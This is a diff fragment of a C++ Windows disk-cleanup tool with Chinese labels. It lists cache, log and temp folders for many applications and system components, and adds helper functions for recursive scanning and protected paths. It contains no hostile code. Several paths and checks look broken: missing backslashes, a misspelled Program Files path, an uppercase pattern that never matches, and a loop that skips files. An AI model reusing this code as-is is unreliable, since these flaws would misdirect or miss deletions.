+            targets.push_back({std::wstring(userProfile) + L"\\AppData\\Local\\Teams\\Cache", L"Teams缓存", L"Microsoft Teams缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(userProfile) + L"\\AppData\\Local\\Teams\\Code Cache", L"Teams代码缓存", L"Microsoft Teams代码缓存", {L"*"}, true, 1});
+            targets.push_back({std::wstring(userProfile) + L"\\AppData\\Local\\Teams\\GPUCache", L"Teams GPU缓存", L"Microsoft Teams GPU缓存", {L"*"}, true, 1});
+            targets.push_back({std::wstring(userProfile) + L"\\AppData\\Local\\Teams\\blob_storage", L"Teams Blob存储", L"Microsoft Teams Blob数据存储(会议录制缩略图等)", {L"*"}, true, 1});
+            targets.push_back({std::wstring(userProfile) + L"\\AppData\\Local\\Teams\\databases", L"Teams数据库缓存", L"Microsoft Teams数据库(可重建)", {L"*.db", L"*.db-journal"}, false, 1});
+            targets.push_back({std::wstring(userProfile) + L"\\AppData\\Local\\Teams\\tmp", L"Teams临时文件", L"Microsoft Teams临时文件", {L"*"}, false, 1});
+            targets.push_back({std::wstring(userProfile) + L"\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cache", L"Brave用户缓存", L"Brave浏览器用户缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(userProfile) + L"\\AppData\\Local\\Vivaldi\\User Data\\Default\\Cache", L"Vivaldi用户缓存", L"Vivaldi浏览器用户缓存", {L"*"}, true, 2});
+        }
+
+        targets.push_back({L"C:\\PerfLogs\\Support", L"性能日志", L"Windows性能日志", {L"*"}, true, 2});
+        targets.push_back({L"C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp", L"程序数据错误报告", L"程序数据临时错误报告", {L"*"}, true, 2});
+        targets.push_back({L"C:\\ProgramData\\Microsoft\\Windows\\WER\\Archive", L"错误报告归档", L"程序数据错误报告归档", {L"*"}, true, 2});
+
+        // ====== 系统升级残留 ======
+        // 注意: $WINDOWS.~BT 和 Windows.old 不在此清理，需用户手动通过磁盘清理工具删除
+        // 原因: 含系统回滚关键文件，误删可能导致无法回退或数据丢失
+        targets.push_back({L"C:\\$WINDOWS.~LS", L"Win升级日志", L"Windows系统升级安装日志", {L"*.log", L"*.xml"}, true, 2});
+        targets.push_back({L"C:\\Windows\\SoftwareDistribution\\DataStore", L"更新数据存储", L"Windows更新数据存储库", {L"*.log", L"*.edb"}, true, 2});
+        targets.push_back({L"C:\\Windows\\SoftwareDistribution\\PostRebootEventCache.V2", L"重启事件缓存", L"Windows更新重启后事件缓存(可自动重建)", {L"*"}, false, 1});
+
+        // ====== GPU驱动缓存 ======
+        // 注意: GPU着色器缓存不清理，重建会导致游戏/应用首次启动严重卡顿(Shader Compilation Stutter)
+        // 如确需清理，请使用GPU驱动控制面板中的"清除着色器缓存"功能
+
+        // ====== Adobe系列 ======
+        if (localAppData[0] != L'\0') {
+            targets.push_back({std::wstring(localAppData) + L"\\Adobe\\Acrobat", L"Acrobat缓存", L"Adobe Acrobat临时缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Adobe\\CameraRaw", L"Camera Raw缓存", L"Adobe Camera Raw处理缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Adobe\\Headlights", L"Headlights缓存", L"Adobe Headlights缓存", {L"*"}, true, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\Adobe\\Common\\Media Cache Files", L"Adobe媒体缓存", L"Adobe通用媒体缓存文件(仅临时文件)", {L"*.pek", L"*.cfa", L"*.idx", L".mxf.*"}, true, 3});
+            targets.push_back({std::wstring(localAppData) + L"\\Adobe\\Logs", L"Adobe日志", L"Adobe产品运行日志", {L"*.log"}, true, 1});
+        }
+        if (appData[0] != L'\0') {
+            targets.push_back({std::wstring(appData) + L"\\Adobe\\Common\\Media Cache Files", L"Adobe漫游媒体缓存", L"Adobe漫游配置媒体缓存(仅临时)", {L"*.pek", L"*.cfa", L"*.idx"}, true, 2});
+        }
+        targets.push_back({L"C:\\ProgramFiles(x86)\\Common Files\\Adobe\\Log", L"Adobe公共日志", L"Adobe公共组件日志", {L"*"}, true, 1});
+
+        // ====== Microsoft Office系列 ======
+        if (localAppData[0] != L'\0') {
+            // Office Click-to-Run文档缓存(邮件附件自动下载、共享文档缓存)
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Office\\16.0\\OfficeFileCache", L"Office文档缓存", L"Microsoft Office文档自动缓存(邮件附件等)", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Office\\16.0\\WebServiceCache", L"Office Web缓存", L"Office Web服务缓存", {L"*"}, true, 1});
+        }
+
+        // ====== 游戏平台/通讯软件 ======
+        if (localAppData[0] != L'\0') {
+            // Steam
+            targets.push_back({std::wstring(localAppData) + L"\\Steam\\htmlcache", L"Steam网页缓存", L"Steam内置浏览器缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Steam\\appcache", L"Steam应用缓存", L"Steam应用资源缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Steam\\logs", L"Steam日志", L"Steam客户端日志", {L"*.log", L"*.txt"}, true, 1});
+            // Epic Games
+            targets.push_back({std::wstring(localAppData) + L"\\EpicGamesLauncher\\Saved\\Logs", L"Epic日志", L"Epic Games启动器日志", {L"*.log"}, true, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\EpicGamesLauncher\\Saved\\Intermediate", L"Epic中间文件(日志)", L"Epic Games中间编译产物(仅日志，保留着色器缓存)", {L"*.log", L"*.tmp"}, false, 1});
+            // Ubisoft Connect
+            targets.push_back({std::wstring(localAppData) + L"\\Ubisoft Game Launcher\\cache", L"Ubisoft缓存", L"育碧启动器缓存", {L"*"}, true, 2});
+            // Origin/EA
+            targets.push_back({std::wstring(localAppData) + L"\\Origin\\Logs", L"Origin日志", L"EA Origin平台日志", {L"*.log"}, true, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\Origin\\DownloadCache", L"Origin下载缓存", L"EA Origin游戏安装包分片缓存(已装游戏不受影响)", {L"*"}, false, 1});
+            // EA App(新EA桌面客户端，替代Origin)
+            targets.push_back({std::wstring(localAppData) + L"\\Electronic Arts\\EA Desktop\\Logs", L"EA App日志", L"EA Desktop新客户端日志", {L"*.log"}, true, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\Electronic Arts\\EA Desktop\\Cache", L"EA App缓存", L"EA Desktop客户端缓存", {L"*"}, true, 2});
+            // Battle.net
+            targets.push_back({std::wstring(localAppData) + L"\\Battle.net\\Cache", L"战网缓存", L"暴雪战网平台缓存", {L"*"}, true, 2});
+            // Riot Games(Valorant/LoL/瓦罗兰特/英雄联盟)
+            targets.push_back({std::wstring(localAppData) + L"\\Riot Games", L"Riot Games缓存", L"拳头游戏客户端缓存(日志/临时文件)", {L"*.log", L"*.tmp", L"*.cache"}, true, 2});
+            // QQ
+            // 注意: FileRecv(接收文件)不清理，用户文件可能仍在使用
+            targets.push_back({std::wstring(localAppData) + L"\\Tencent\\QQ\\Temp", L"QQ临时文件", L"QQ临时文件目录", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Tencent\\QQ\\Image", L"QQ图片缓存", L"QQ聊天图片缓存", {L"*.jpg", L"*.png", L"*.gif", L"*.webp"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Tencent\\QQ\\Video", L"QQ视频缓存", L"QQ短视频缓存", {L"*"}, true, 2});
+            // 微信
+            targets.push_back({std::wstring(localAppData) + L"\\Tencent\\WeChat\\FileStorage\\Temp", L"微信临时文件", L"微信临时文件存储", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Tencent\\WeChat\\Xlog", L"微信日志", L"微信运行日志", {L"*.xlog"}, true, 1});
+            targets.push_back({std::wstring(appData) + L"\\Tencent\\WeChat\\Xweb", L"微信Web缓存", L"微信内置浏览器缓存", {L"*"}, true, 2});
+            // 钉钉
+            targets.push_back({std::wstring(localAppData) + L"\\DingTalk\\Cache", L"钉钉缓存", L"钉钉应用缓存", {L"*"}, true, 2});
+            // 飞书
+            targets.push_back({std::wstring(localAppData) + L"\\Feishu", L"飞书缓存", L"飞书(Lark)应用缓存", {L"*"}, true, 2});
+            // 企业微信(WeCom/WeWork)
+            targets.push_back({std::wstring(localAppData) + L"\\WeWork\\User\\*\\Profiles\\Cache", L"企业微信缓存", L"企业微信文件缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(appData) + L"\\WeWork\\User\\*\\Profiles\\Xlog", L"企业微信日志", L"企业微信运行日志", {L"*.xlog"}, true, 1});
+            // TIM(QQ办公版)
+            targets.push_back({std::wstring(localAppData) + L"\\Tencent\\TIM\\Temp", L"TIM临时文件", L"TIM临时文件目录", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Tencent\\TIM\\Image", L"TIM图片缓存", L"TIM聊天图片缓存", {L"*.jpg", L"*.png", L"*.gif", L"*.webp"}, true, 2});
+            // 百度网盘 - 仅清理临时文件，不清理实际下载的文件
+            targets.push_back({std::wstring(localAppData) + L"\\baidunetdisk\\download", L"百度网盘缓存(临时项)", L"百度网盘下载临时文件(保留已下载文件)", {L"*.tmp", L"*.part"}, false, 1});
+            // OneDrive
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\OneDrive\\temp", L"OneDrive临时文件", L"OneDrive同步临时文件", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\OneDrive\\settings", L"OneDrive设置临时", L"OneDrive设置目录(仅临时文件，保留配置)", {L"*.tmp", L"*.old", L"*.bak"}, false, 1});
+        }
+
+        // ====== 开发工具缓存 ======
+        if (localAppData[0] != L'\0') {
+            // VS Code
+            targets.push_back({std::wstring(localAppData) + L"\\.vscode\\CachedData", L"VSCode缓存", L"VS Code编辑器缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\.vscode\\CachedExtensionVSIXs", L"VSCode扩展缓存", L"VS Code扩展包缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\.vscode\\User\\workspaceStorage", L"VSCode工作区状态", L"VS Code工作区布局状态(非关键，删除后恢复默认)", {L"*"}, false, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\.vscode\\User\\History", L"VSCode本地历史", L"VS Code编辑器本地历史记录(含文件备份版本)", {L"*"}, false, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\.vscode\\User\\globalStorage", L"VSCode扩展全局数据", L"VS Code扩展全局存储(可能含扩展重要配置)", {L"*.log", L"*.tmp"}, false, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\.vscode\\CrashReporter", L"VSCode崩溃报告", L"VS Code崩溃转储", {L"*.dmp"}, false, 1});
+            // Node.js/npm - 仅清理损坏/过期的缓存条目，保留有效包
+            targets.push_back({std::wstring(localAppData) + L"\\npm-cache", L"npm缓存(损坏项)", L"Node.js npm缓存中损坏的文件", {L"*.tmp", L"*.lock", L".*~"}, false, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\Yarn", L"Yarn缓存(损坏项)", L"Yarn缓存中损坏的文件", {L"*.tmp", L"*.lock"}, false, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\pnpm-cache", L"pnpm缓存(损坏项)", L"pnpm缓存中损坏的文件", {L"*.tmp"}, false, 1});
+            // Python pip - 仅清理临时文件和锁
+            targets.push_back({std::wstring(localAppData) + L"\\pip\\cache", L"Pip缓存(临时项)", L"Python pip缓存中的临时文件", {L"*.tmp", L"*.lock"}, false, 1});
+            // NuGet - 仅清理HTTP缓存和临时文件
+            targets.push_back({std::wstring(localAppData) + L"\\NuGet\\http-cache", L"NuGet HTTP缓存", L".NET NuGet HTTP响应缓存", {L"*"}, true, 2});
+            // Maven
+            targets.push_back({std::wstring(userProfile) + L"\\.m2\\repository", L"Maven本地仓库(失败记录)", L"Java Maven依赖下载失败记录(可重新解析)", {L"*.jar.lastUpdated", L"*.lastUpdated"}, false, 1});
+            // Gradle - 仅清理日志和临时文件，保留构建缓存(重建耗时极长)
+            targets.push_back({std::wstring(localAppData) + L"\\.gradle\\caches", L"Gradle缓存(临时项)", L"Gradle构建工具临时文件(保留依赖缓存)", {L"*.tmp", L"*.lock"}, false, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\.gradle\\daemon", L"Gradle守护进程日志", L"Gradle后台进程日志和缓存", {L"*.log", L"*.out"}, true, 1});
+            // Docker Desktop
+            targets.push_back({std::wstring(localAppData) + L"\\Docker\\log", L"Docker日志", L"Docker Desktop日志", {L"*.log"}, true, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\Docker\\profiles", L"Docker配置缓存", L"Docker Desktop配置文件(仅日志和临时)", {L"*.log", L"*.tmp", L"*.bak"}, false, 1});
+            // Git
+            targets.push_back({std::wstring(localAppData) + L"\\GitHub Desktop", L"GitHub Desktop缓存", L"GitHub Desktop客户端缓存", {L"*"}, true, 1});
+            // WSL
+            targets.push_back({std::wstring(localAppData) + L"\\wsl\\docker-desktop", L"WSL Docker数据", L"WSL Docker Desktop数据", {L"*.log", L"*.vhdx.bak"}, true, 1});
+            // Flutter/Dart
+            targets.push_back({std::wstring(localAppData) + L"\\.dartServer", L"Dart服务器缓存", L"Dart语言分析服务器缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\.pub-cache", L"Pub包缓存", L"Dart/Flutter Pub依赖包缓存(可重新下载)", {L"*"}, true, 3});
+            // Unity编辑器缓存(项目导入缓存、着色器编译缓存等)
+            targets.push_back({std::wstring(localAppData) + L"\\Unity", L"Unity编辑器缓存", L"Unity游戏引擎编辑器缓存(日志/临时文件)", {L"*.log", L"*.tmp", L"*.cache"}, true, 2});
+            // Visual Studio组件缓存
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\VisualStudio", L"VS组件缓存", L"Visual Studio组件和扩展缓存(可重建)", {L"*.cache", L"*.tmp", L"*.log"}, true, 2});
+        }
+
+        // ====== 更多系统路径 ======
+        targets.push_back({L"C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization", L"传递优化缓存", L"Windows传递优化(P2P更新)缓存", {L"*"}, true, 5});
+        targets.push_back({L"C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Windows\\INetCacheContent", L"服务IE缓存", L"系统服务账户IE缓存", {L"*"}, true, 2});
+        targets.push_back({L"C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCacheContent", L"系统IE缓存", L"SYSTEM账户IE缓存", {L"*"}, true, 2});
+        targets.push_back({L"C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Temp", L"系统用户临时", L"SYSTEM账户临时文件夹", {L".tmp", L".temp", L"~$*"}, true, 3});
+        targets.push_back({L"C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Temp", L"本地服务临时", L"LocalService账户临时文件夹", {L".tmp", L".temp", L"~$*"}, true, 3});
+        targets.push_back({L"C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp", L"网络服务临时", L"NetworkService账户临时文件夹", {L".tmp", L".temp", L"~$*"}, true, 3});
+        targets.push_back({L"C:\\Windows\\System32\\sru", L"SRU数据库", L"系统资源使用率数据库", {L"*.srx"}, false, 1});
+        targets.push_back({L"C:\\Windows\\System32\\SleepStudy", L"睡眠研究", L"Windows电源诊断休眠报告", {L"*.xml"}, false, 1});
+        targets.push_back({L"C:\\Windows\\LiveKernelReports", L"内核崩溃报告", L"Windows内核实时故障报告", {L"*.WER-internal.xml", L"*.RPT"}, true, 2});
+        targets.push_back({L"C:\\Windows\\Minidump", L"小内存转储", L"Windows蓝屏小内存转储文件", {L"*.dmp"}, true, 2});
+        targets.push_back({L"C:\\ProgramData\\USOShared\\Logs", L"USO日志", L"Update Session Orchestrator日志", {L"*"}, true, 1});
+        targets.push_back({L"C:\\ProgramData\\Microsoft\\Diagnosis", L"诊断日志", L"Windows诊断事件跟踪日志", {L"*.etl"}, true, 2});
+        targets.push_back({L"C:\\Windows\\INF", L"驱动安装缓存", L"Windows INF驱动程序安装缓存(仅.pnf)", {L"*.pnf"}, true, 1});
+        targets.push_back({L"C:\\Windows\\System32\\DriverStore\\FileRepository", L"驱动存储库", L"驱动程序存储库备份(谨慎)", {L"*_del_*", L"*_bak_*"}, false, 1});
+        targets.push_back({L"C:\\Windows\\System32\\FxsTmp", L"FXS临时文件", L"Windows传真服务临时文件", {L"*"}, true, 1});
+        targets.push_back({L"C:\\Windows\\System32\\com\\dmp", L"COM+转储", L"COM+组件内存转储文件", {L"*.dmp"}, true, 1});
+        targets.push_back({L"C:\\Windows\\rescache", L"资源缓存", L"Windows MUI多语言资源缓存", {L"*.rcdb"}, true, 1});
+        targets.push_back({L"C:\\Windows\\appcompat\\Programs", L"兼容性缓存", L"应用程序兼容性缓存", {L"*.txt", L"*.xml"}, true, 1});
+        targets.push_back({L"C:\\Windows\\System32\\wbem\\Logs", L"WMI日志", L"Windows管理规范(WMI)日志", {L"*.log"}, true, 1});
+        targets.push_back({L"C:\\Windows\\System32\\sysprep\\Panther", L"Sysprep日志", L"系统准备工具日志", {L"*.log"}, true, 1});
+        targets.push_back({L"C:\\Windows\\System32\\wdi\\LogFiles", L"WDI日志", L"Windows诊断基础设施日志", {L"*.xml"}, true, 1});
+        targets.push_back({L"C:\\Windows\\CbsTemp", L"CBS临时文件", L"基于组件的服务(CBS)临时文件", {L"*"}, true, 2});
+        targets.push_back({L"C:\\Windows\\Logs\\CBS", L"CBS日志", L"Windows组件安装日志(更新后可达数GB)", {L"*.log", L"*.cab", L"*.xml", L"*.persist"}, false, 1});
+        targets.push_back({L"C:\\ProgramData\\Microsoft\\Search\\Data\\Applications", L"搜索索引", L"Windows搜索索引临时数据", {L"*.wid", L"*.ci"}, true, 1});
+        targets.push_back({L"C:\\ProgramData\\Microsoft\\Windows Defender\\Support", L"Defender支持文件", L"Windows Defender旧版本支持文件(可自动重建)", {L"*"}, false, 1});
+        targets.push_back({L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\disabled", L"禁用启动项", L"已禁用的启动项快捷方式", {L"*"}, false, 1});
+
+        // ====== 更多软件缓存 ======
+        if (localAppData[0] != L'\0') {
+            // Zoom - 仅清理缓存和日志，不清理会议录制(用户重要数据)
+            targets.push_back({std::wstring(localAppData) + L"\\Zoom\\data", L"Zoom缓存(仅临时)", L"Zoom视频会议临时缓存(保留录制/背景)", {L"*.cache", L"*.tmp", L"*.log"}, false, 1});
+            // Telegram - 仅清理缓存，不碰用户数据
+            targets.push_back({std::wstring(localAppData) + L"\\Telegram Desktop\\tdata\\user_data", L"Telegram缓存(仅临时)", L"Telegram桌面端临时缓存", {L"*.cache", L"*.tmp"}, true, 1});
+            // Notion
+            targets.push_back({std::wstring(localAppData) + L"\\Notion\\Cache", L"Notion缓存", L"Notion笔记应用缓存", {L"*"}, true, 2});
+            // OBS Studio
+            targets.push_back({std::wstring(localAppData) + L"\\obs-studio\\crashes", L"OBS崩溃报告", L"OBS Studio崩溃转储", {L"*.dmp"}, false, 1});
+            // Blender - 渲染缓存可能包含重要中间结果，仅清理临时文件
+            targets.push_back({std::wstring(localAppData) + L"\\Blender Foundation\\Blender\\cache", L"Blender缓存(临时项)", L"Blender 3D渲染临时文件", {L"*.tmp", L".blend*~"}, false, 1});
+            // Figma - 仅清理缓存文件，保留离线项目数据
+            targets.push_back({std::wstring(localAppData) + L"\\Figma", L"Figma缓存(仅临时)", L"Figma设计工具临时缓存(保留离线项目)", {L"*.cache", L"*.tmp", L"*.log"}, false, 1});
+            // MATLAB
+            targets.push_back({std::wstring(localAppData) + L"\\MathWorks", L"MATLAB缓存(临时项)", L"MATLAB数学工具临时文件", {L"*.log", L"*.tmp"}, false, 1});
+            // JetBrains IDEs - 仅清理日志和崩溃报告，保留索引和构建缓存
+            targets.push_back({std::wstring(localAppData) + L"\\JetBrains", L"JetBrains缓存(日志/崩溃)", L"JetBrains全家桶IDE日志和崩溃报告", {L"*.log", L"*.dmp", L"*.hprof"}, false, 1});
+            // VLC
+            targets.push_back({std::wstring(localAppData) + L"\\vlc\\cache", L"VLC缓存", L"VLC播放器缓存", {L"*"}, true, 2});
+            // Thunderbird - 仅清理缓存，不碰邮件数据
+            targets.push_back({std::wstring(localAppData) + L"\\Thunderbird\\Profiles", L"Thunderbird缓存(仅临时)", L"Mozilla Thunderbird邮件客户端缓存", {L"*.cache", L"*.cache2", L"*.tmp"}, true, 1});
+            // Foxmail
+            targets.push_back({std::wstring(localAppData) + L"\\Foxmail\\Temp", L"Foxmail临时文件", L"Foxmail邮件客户端临时文件", {L"*"}, true, 2});
+            // 360安全卫士
+            targets.push_back({std::wstring(localAppData) + L"\\360safe", L"360缓存", L"360安全卫士缓存", {L"*"}, true, 2});
+            // 金山毒霸/WPS - 不清理！WPS自动保存草稿(autosave)在此目录下
+            // 误删将导致用户无法恢复未保存文档，属于关键用户数据
+            // targets.push_back({std::wstring(localAppData) + L"\\Kingsoft", ...}); // 已禁用:含WPS自动保存
+            // 迅雷 - 仅清理临时文件和未完成下载的碎片，保留已下载文件
+            targets.push_back({std::wstring(localAppData) + L"\\ThunderDownload", L"迅雷缓存(临时项)", L"迅雷下载工具临时文件(保留已下载)", {L"*.tmp", L".part*", L".td"}, false, 1});
+            // IDA Pro - 仅清理临时文件，绝对不能删.id0/.id1/.nam/.til数据库文件
+            targets.push_back({std::wstring(localAppData) + L"\\IDA", L"IDA缓存(仅临时)", L"IDA Pro逆向工程工具临时文件(保留分析数据库)", {L"*.tmp", L"*.log"}, false, 1});
+            // Wireshark
+            targets.push_back({std::wstring(localAppData) + L"\\Wireshark", L"Wireshark缓存", L"Wireshark抓包工具缓存", {L"*"}, true, 1});
+            // WinRAR
+            targets.push_back({std::wstring(localAppData) + L"\\WinRAR", L"WinRAR临时文件", L"WinRAR解压临时文件", {L"*"}, true, 1});
+            // 7-Zip
+            targets.push_back({std::wstring(localAppData) + L"\\7-Zip", L"7-Zip临时文件", L"7-Zip解压临时文件", {L"*"}, true, 1});
+            // Bandizip
+            targets.push_back({std::wstring(localAppData) + L"\\Bandizip", L"Bandizip临时文件", L"Bandizip压缩工具临时文件", {L"*"}, true, 1});
+            // Snipaste
+            targets.push_back({std::wstring(localAppData) + L"\\Snipaste", L"Snipaste缓存", L"Snipaste截图工具缓存", {L"*"}, true, 1});
+            // Everything搜索
+            targets.push_back({std::wstring(localAppData) + L"\\Everything", L"Everything缓存", L"Everything文件搜索工具缓存", {L"*"}, true, 1});
+            // Listary
+            targets.push_back({std::wstring(localAppData) + L"\\Listary", L"Listary缓存", L"Listary文件搜索增强工具缓存", {L"*"}, true, 1});
+            // PotPlayer
+            targets.push_back({std::wstring(localAppData) + L"\\Daum\\PotPlayerMini\\Capture", L"PotPlayer截图", L"PotPlayer播放器自动截图缓存", {L"*"}, true, 2});
+            // QQ音乐 - 仅清理临时缓存，保留离线下载的音乐
+            targets.push_back({std::wstring(localAppData) + L"Tencent\\QQMusic\\Cache", L"QQ音乐缓存(临时项)", L"QQ音乐音频临时缓存", {L"*.tmp", L"*.qmc2~"}, false, 1});
+            // 网易云音乐
+            targets.push_back({std::wstring(localAppData) + L"NetEase\\CloudMusic\\Cache", L"网易云缓存(临时项)", L"网易云音乐临时缓存", {L"*.tmp"}, false, 1});
+            // 酷狗音乐
+            targets.push_back({std::wstring(localAppData) + L"KuGou\\Cache", L"酷狗缓存(临时项)", L"酷狗音乐临时缓存", {L"*.tmp", L"*.kgm~"}, false, 1});
+            // NVIDIA 非着色器驱动缓存(安装临时、崩溃报告、Display容器日志)
+            // 注意: 不清理D3DSCache/NVIDIA DXCache等着色器缓存(重建会导致游戏卡顿)
+            targets.push_back({std::wstring(localAppData) + L"NVIDIA", L"NVIDIA日志(非着色器)", L"NVIDIA显卡驱动日志/崩溃报告/临时文件(保留着色器缓存)", {L"*.log", L"*.dmp", L"*.tmp"}, true, 2});
+        }
+
+        return targets;
+    }
+
+    static bool IsFileInUse(const std::wstring& path) {
+        HANDLE hFile = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile != INVALID_HANDLE_VALUE) {
+            CloseHandle(hFile);
+            return false;
+        }
+        return GetLastError() == ERROR_SHARING_VIOLATION || GetLastError() == ERROR_LOCK_VIOLATION;
+    }
+
+    static bool IsSystemFile(const std::wstring& path) {
+        std::wstring lowerPath = path;
+        std::transform(lowerPath.begin(), lowerPath.end(), lowerPath.begin(), ::towlower);
+
+        static const std::vector<std::wstring> protectedPaths = {
+            L"\\windows\\system32\\",
+            L"\\windows\\syswow64\\",
+            L"\\program files\\",
+            L"\\program files (x86)\\",
+            L"\\windows\\winsxs\\",
+            L"\\programdata\\microsoft\\",
+            L"\\$recycle.bin\\",
+            L"\\system volume information\\",
+            L"\\PerfLogs\\"
+        };
+
+        for (const auto& protectedPath : protectedPaths) {
+            if (lowerPath.find(protectedPath) != std::wstring::npos) {
+                return true;
+            }
+        }
+
+        return false;
+    }
+
+    static bool MatchExtension(const std::wstring& filename, const std::vector<std::wstring>& extensions) {
+        if (extensions.empty()) return false;
+        if (extensions[0] == L"*") return true;
+
+        std::wstring lowerName = filename;
+        std::transform(lowerName.begin(), lowerName.end(), lowerName.begin(), ::towlower);
+
+        for (const auto& ext : extensions) {
+            std::wstring lowerExt = ext;
+            std::transform(lowerExt.begin(), lowerExt.end(), lowerExt.begin(), ::towlower);
+
+            if (lowerExt[0] == L'.') {
+                if (lowerName.size() >= lowerExt.size() &&
+                    lowerName.compare(lowerName.size() - lowerExt.size(), lowerExt.size(), lowerExt) == 0) {
+                    return true;
+                }
+            }
+            else {
+                if (lowerName.find(lowerExt) != std::wstring::npos) {
+                    return true;
+                }
+            }
+        }
+        return false;
+    }
+
+    static void ScanDirectory(const ScanTarget& target, std::vector<GarbageFileInfo>& localFiles, int currentDepth = 0) {
+        if (g_stopRequested.load() || (target.maxDepth >= 0 && currentDepth > target.maxDepth)) {
+            return;
+        }
+
+        std::wstring basePath = target.path;
+        if (basePath.empty()) {
+            return;
+        }
+
+        static const wchar_t* systemPathPrefixes[] = {
+            L"\\windows\\system32\\",
+            L"\\windows\\syswow64\\",
+            L"\\program files\\",
+            L"\\program files (x86)\\",
+            L"\\windows\\winsxs\\",
+            L"\\programdata\\microsoft\\",
+            L"\\$recycle.bin\\",
+            L"\\system volume information\\",
+            L"\\perflogs\\",
+            // ====== Visual Studio 关键目录 (绝对不可删除) ======
+            L"\\microsoft visual studio\\",            // VS 主程序 (2022/2019/2017 等)
+            L"\\msbuild\\",                            // MSBuild 工具链
+            L"\\windows kits\\",                       // Windows SDK
+            L"\\dotnet\\",                             // .NET SDK/Runtime
+            L"\\dotnetfx\\",                           // .NET Framework
+            L"\\microsoft sdk\\",                      // 旧版 Microsoft SDK
+            L"\\windows performance toolkit\\",        // Windows Performance Toolkit
+            L"\\microsoft sql server\\",               // SQL Server
+            L"\\microsoft office\\",                   // Office (在 Program Files 下)
+            L"\\microsoft visualstudio\\",            // VS 共享组件/扩展
+            L"\\vs_enterprise\\",                      // VS Enterprise 版
+            L"\\vs_professional\\",                    // VS Professional 版
+            L"\\vs_community\\",                       // VS Community 版
+            // ====== 编译器/工具链 ======
+            L"\\mingw\\",
+            L"\\cygwin\\",
+            L"\\msys2\\",
+            L"\\llvm\\",
+            L"\\clion\\",
+            L"\\rider\\",
+            L"\\android studio\\",
+            L"\\intellij idea\\",
+            L"\\pycharm\\",
+            L"\\webstorm\\",
+            L"\\phpstorm\\",
+            L"\\goland\\",
+            L"\\datagrip\\",
+            // ====== 游戏平台安装目录 ======
+            L"\\steam\\",
+            L"\\steamlibrary\\",
+            L"\\epic games\\",
+            L"\\riot games\\",
+            L"\\battlenet\\",
+            L"\\origin\\",
+            L"\\ubisoft game launcher\\",
+            // ====== 关键系统服务 ======
+            L"\\appdata\\local\\microsoft\\onedrive\\", // OneDrive 主目录(非缓存)
+            L"\\appdata\\local\\google\\chrome\\user data\\", // Chrome 用户数据(非缓存)
+            L"\\appdata\\local\\microsoft\\edge\\user data\\", // Edge 用户数据
+            L"\\appdata\\roaming\\microsoft\\",        // 用户漫游配置
+            L"\\appdata\\local\\packages\\",            // UWP 应用
+        };
+
+        WIN32_FIND_DATAW findData;
+        HANDLE hFind = FindFirstFileW((basePath + L"\\*").c_str(), &findData);
+
+        if (hFind == INVALID_HANDLE_VALUE) {
+            return;
+        }
+
+        do {
+            if (g_stopRequested.load()) break;
+
+            std::wstring filename = findData.cFileName;
+
+            if (filename == L"." || filename == L"..") {
+                continue;
+            }
+
+            std::wstring fullPath = basePath + L"\\" + filename;
+            g_progress.scannedFiles.fetch_add(1, std::memory_order_relaxed);
+
+            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                if (target.scanSubdirs && currentDepth < target.maxDepth) {
+                    ScanDirectory({fullPath, target.category, target.description, target.extensions, target.scanSubdirs, target.maxDepth}, localFiles, currentDepth + 1);
+                }
+            }
+            else {
+                if (MatchExtension(filename, target.extensions)) {
+                    std::wstring lowerPath = fullPath;
+                    for (auto& c : lowerPath) c = towlower(c);
+
+                    bool isProtected = false;
+                    for (const auto& prefix : systemPathPrefixes) {
+                        if (lowerPath.find(prefix) != std::wstring::npos) {
+                            isProtected = true;
+                            break;
+                        }
+                    }
+
+                    if (isProtected) {
+                        FindNextFileW(hFind, &findData);
+                        continue;
+                    }
+
